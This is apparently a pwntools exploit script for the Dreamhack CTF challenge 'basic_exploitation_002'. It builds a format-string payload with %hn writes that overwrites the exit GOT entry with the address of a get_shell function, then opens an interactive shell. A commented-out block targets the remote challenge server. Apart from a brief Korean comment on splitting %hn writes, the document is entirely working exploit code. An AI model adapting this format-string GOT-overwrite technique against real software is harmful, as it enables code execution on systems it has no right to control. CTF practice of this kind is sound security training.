from pwn import *
def slog(name, addr):
	return (": ".join([name, hex(addr)]))

context.arch = "i386"
context.log_level = "debug"

# Local
p = process("./basic_exploitation_002")

# Online
"""
PORT = int(input("Port: "))
HOST = int(input("Host: "))
p = remote("host" + str(HOST) + ".dreamhack.games", PORT)
"""

elf = ELF("./basic_exploitation_002")

get_shell = elf.symbols["get_shell"]	# 0x08048609
exit_got = elf.got["exit"]		# 0x0804a024
log.info(hex(get_shell))
log.info(hex(exit_got))

payload = p32(exit_got + 2)		# 0xa024
payload += p32(exit_got)		# 0x0804
payload += b"%" + b"%d"%(0x0804 - 0x8) + b"c%1$hn"	# 0x0804
payload += b"%" + b"%d"%(0x8609 - 0x804) + b"c%2$hn"	# 0x8609
#payload += b"%" + b"%d"%(0x8609 - 0x2) + b"c%hn"
# %hn, %hhn으로 나눌 때는 주소의 모든 부분을 건드려야 함.
log.info(payload)

p.sendline(payload)

p.interactive()
